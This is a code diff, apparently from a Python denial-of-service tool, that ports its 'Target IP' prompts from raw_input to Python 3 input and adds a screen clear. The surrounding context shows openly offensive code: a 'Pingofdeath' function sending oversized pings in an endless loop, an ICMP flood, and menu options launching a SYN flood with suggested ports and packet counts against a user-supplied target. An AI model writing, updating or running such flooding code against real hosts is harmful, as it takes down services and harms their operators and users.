@@ -64,14 +64,14 @@ def Ping_sl():
         for a in range(ping_number):
 		os.system("ping " + ip)
 def Pingofdeath():
-    victimIP = raw_input("Target IP: ")
+    victimIP = str(input("Target IP: "))
     pingCommand = "ping " + victimIP + " -l 65500 -w 1 -n 1"
         
     while(1):
         os.system(pingCommand)
 
 def Icmpflood():
-    targetip = raw_input("Target IP: ")
+    targetip = str(input("Target IP: "))
     cycle = int(input("Number of packets: "))
 
     for x in range (0,int(cycle)):
@@ -104,12 +104,13 @@ def main():
 	print("Disclaimer: On Termux this attack doesn't work (unless you are Root)")
 	print("because of sockets permissions.")   
 	time.sleep(5)
+	os.system("clear")
 	print("  ______    ____       _____")
         print(" /_  __/   / __ \____ / ___/")
         print("  / /_____/ / / / __ \\__ \ ")
         print(" / /_____/ /_/ / /_/ /__/ / ")
         print("/_/     /_____/\____/____/  ")
-        dstIP = raw_input("Target IP: ")
+        dstIP = str(input("Target IP: "))
         dstPort = int(input("Target Port (443 suggested): "))
         counter = int(input("Packets to send (5000 suggested): "))
         SYN_Flood(dstIP,dstPort,int(counter))
@@ -120,7 +121,7 @@ def main():
         print("  / /_____/ / / / __ \\__ \ ")
         print(" / /_____/ /_/ / /_/ /__/ / ")
         print("/_/     /_____/\____/____/  ")
-        target = raw_input("Target IP: ")
+        target = str(input("Target IP: "))
         port = int(input("Target Port (80 suggested): "))
         Attack(target, port)
     elif option == 3:
@@ -138,7 +139,7 @@ def main():
         print("  / /_____/ / / / __ \\__ \ ")
         print(" / /_____/ /_/ / /_/ /__/ / ")
         print("/_/     /_____/\____/____/  ")
-	ip_addr = raw_input("Target IP: ") 
+	ip_addr = str(input("Target IP: ")) 
 	stream = os.popen('ping -c 5000 {}'.format(ip_addr))
 	output = stream.read() 
 	if '0 received' in output:
